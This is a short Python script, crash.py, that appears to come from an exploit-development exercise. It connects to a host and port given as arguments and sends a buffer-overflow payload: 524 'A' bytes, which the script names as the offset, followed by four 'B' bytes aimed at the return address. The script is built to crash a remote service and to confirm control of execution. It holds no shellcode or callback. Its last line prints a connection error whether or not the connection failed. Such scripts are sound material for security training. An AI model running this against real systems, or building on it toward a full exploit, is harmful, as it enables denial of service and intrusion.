#!/usr/bin/python
# Python Script (crash.py)

import socket
import sys

ip = sys.argv[1]
port = int(sys.argv[2])

offset = 524
payload = b"A" * offset

retrn = b"B" * 4
payload += retrn

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.recv(1024)
s.send(payload)
# print(s.recv(1024))
print("[!] Error connecting to server!")
